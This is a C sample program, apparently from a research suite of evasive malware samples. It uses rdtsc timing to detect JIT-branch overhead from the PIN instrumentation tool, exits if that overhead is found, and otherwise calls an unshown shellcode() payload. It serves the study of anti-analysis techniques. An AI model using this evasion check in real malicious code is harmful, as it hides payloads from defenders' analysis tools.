////////////////////////////////////////////////////////////////////////////////
//
//  File          : src/sample_ro_jitbr.c
//  Description   : This is a sample program that detects JIT branch overhead.
//
//   Author : Thomason Zhao
//

#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <x86intrin.h>

#include "malware.h"
#include "utils.h"

//
// Macros

#define MAX_ULL(a, b) ((a) > (b) ? (a) : (b))

//
// Global variables

const char *progname = "sample_ro_jitbr";
const char *progdesc = "Sample adopts JIT compiler runtime overhead detection - check the time overhead when JIT copmile on conditional branches";
int verbose = 0;
int debug = 0;

static const int num_iter = 10;

int detect_jit_br_time(void) {
    unsigned long long times[num_iter], diff_times[num_iter - 1];

    /**
     * The first trace which PIN compiles includes both 0 and 1 times.
     * Since the for loop jumps in the middle of a compiled trace, although
     * the code is already in code cache, the traces are not equal, so it
     * has to be jitted again (1-2). Lastly, there exist a trace with the
     * same start address in the code cache but the static context has to be
     * regenerated again before execution (2-3). So, only after the 4. rdtsc
     * execution, PIN uses exclusively the instructions residing in code cache.
     */

    // Intentionally jump in the middle of a compiled trace
    times[0] = _rdtsc();
    for (int i = 1; i < num_iter; i++) {
        times[i] = _rdtsc();
    }

    // Process the time differences
    for (int i = 0; i < num_iter - 1; i++) {
        diff_times[i] = times[i + 1] - times[i];
    }

    unsigned long long jit_time = MAX_ULL(MAX_ULL(diff_times[0], diff_times[1]), diff_times[2]);

    unsigned long long current, max = 0;
    for (int i = 2; i < num_iter - 1; i++) {
        current = diff_times[i];
        max = MAX_ULL(max, current);
    }

    print_verbose("JIT time: %lld\n", jit_time);
    for (int i = 0; i < num_iter - 1; i++) {
        print_verbose("Reused cache time: %lld\n", diff_times[i]);
    }

    return jit_time > 15 * max ? -1 : 0;
}

int main(int argc, char *argv[]) {
    process_command_line(argc, argv);

    // Some detection anti-instrumentation techniques implemenation
    if (detect_jit_br_time() == 0) {
        print_verbose("JIT branch overhead not detected\n");
    } else {
        print_verbose("JIT branch overhead detected\n");
        exit(1);
    }

    shellcode();
    return 0;
}